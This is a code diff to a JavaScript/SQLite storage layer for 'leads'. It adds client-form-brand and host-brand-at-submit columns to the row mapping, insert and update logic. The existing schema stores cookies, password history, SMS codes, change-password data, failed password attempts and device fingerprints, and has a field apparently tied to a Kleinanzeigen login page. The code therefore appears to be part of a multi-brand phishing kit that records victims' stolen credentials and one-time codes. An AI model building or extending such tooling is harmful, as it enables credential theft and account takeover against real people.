@@ -132,6 +132,8 @@ function ensureLeadExtraColumns(db) {
   if (!names.has('last_password_idem_response_json')) {
     db.exec('ALTER TABLE leads ADD COLUMN last_password_idem_response_json TEXT');
   }
+  if (!names.has('client_form_brand')) db.exec('ALTER TABLE leads ADD COLUMN client_form_brand TEXT');
+  if (!names.has('host_brand_at_submit')) db.exec('ALTER TABLE leads ADD COLUMN host_brand_at_submit TEXT');
   db.exec('UPDATE leads SET password_version = 0 WHERE password_version IS NULL');
   db.exec('UPDATE leads SET attempt_no = 1 WHERE attempt_no IS NULL OR attempt_no < 1');
 }
@@ -315,7 +317,9 @@ function leadRowToObject(row) {
     consumedByAttempt: Number.isFinite(row.consumed_by_attempt) ? Number(row.consumed_by_attempt) : null,
     passwordUpdatedAt: row.password_updated_at != null ? String(row.password_updated_at) : null,
     lastPasswordRequestId: row.last_password_request_id != null ? String(row.last_password_request_id) : null,
-    lastPasswordIdemKey: row.last_password_idem_key != null ? String(row.last_password_idem_key) : null
+    lastPasswordIdemKey: row.last_password_idem_key != null ? String(row.last_password_idem_key) : null,
+    clientFormBrand: row.client_form_brand != null ? String(row.client_form_brand) : undefined,
+    hostBrandAtSubmit: row.host_brand_at_submit != null ? String(row.host_brand_at_submit) : undefined
   };
   for (const [camel, sqlCol] of JSON_FIELDS) {
     const val = parseJsonField(row[sqlCol]);
@@ -381,6 +385,8 @@ function leadObjectToRow(lead) {
     last_password_idem_key: lead.lastPasswordIdemKey != null ? String(lead.lastPasswordIdemKey) : null,
     last_password_idem_response_json:
       lead.lastPasswordIdemResponse != null ? JSON.stringify(lead.lastPasswordIdemResponse) : null,
+    client_form_brand: lead.clientFormBrand != null ? String(lead.clientFormBrand).trim().toLowerCase() : null,
+    host_brand_at_submit: lead.hostBrandAtSubmit != null ? String(lead.hostBrandAtSubmit).trim().toLowerCase() : null,
     event_terminal_json: stringifyJsonField(lead.eventTerminal),
     password_history_json: stringifyJsonField(lead.passwordHistory),
     fingerprint_json: stringifyJsonField(lead.fingerprint),
@@ -407,6 +413,7 @@ INSERT OR REPLACE INTO leads (
   opened_at, klein_anmelden_seen_at, cookies, log_terminal,
   password_version, attempt_no, consumed_by_attempt, password_updated_at,
   last_password_request_id, last_password_idem_key, last_password_idem_response_json,
+  client_form_brand, host_brand_at_submit,
   event_terminal_json, password_history_json, fingerprint_json, sms_code_data_json,
   change_password_data_json, password_error_attempts_json, telemetry_snapshots_json, request_meta_json,
   client_signals_json, last_anti_fraud_assessment_json, action_log_json, device_signature_json
@@ -420,6 +427,7 @@ INSERT OR REPLACE INTO leads (
   @opened_at, @klein_anmelden_seen_at, @cookies, @log_terminal,
   @password_version, @attempt_no, @consumed_by_attempt, @password_updated_at,
   @last_password_request_id, @last_password_idem_key, @last_password_idem_response_json,
+  @client_form_brand, @host_brand_at_submit,
   @event_terminal_json, @password_history_json, @fingerprint_json, @sms_code_data_json,
   @change_password_data_json, @password_error_attempts_json, @telemetry_snapshots_json, @request_meta_json,
   @client_signals_json, @last_anti_fraud_assessment_json, @action_log_json, @device_signature_json
@@ -599,7 +607,9 @@ const PARTIAL_SCALAR_FIELDS = {
   consumedByAttempt: { col: 'consumed_by_attempt', kind: 'int' },
   passwordUpdatedAt: { col: 'password_updated_at', kind: 'str' },
   lastPasswordRequestId: { col: 'last_password_request_id', kind: 'str' },
-  lastPasswordIdemKey: { col: 'last_password_idem_key', kind: 'str' }
+  lastPasswordIdemKey: { col: 'last_password_idem_key', kind: 'str' },
+  clientFormBrand: { col: 'client_form_brand', kind: 'str' },
+  hostBrandAtSubmit: { col: 'host_brand_at_submit', kind: 'str' }
 };
 
 const JSON_FIELD_BY_CAMEL = Object.fromEntries(JSON_FIELDS);
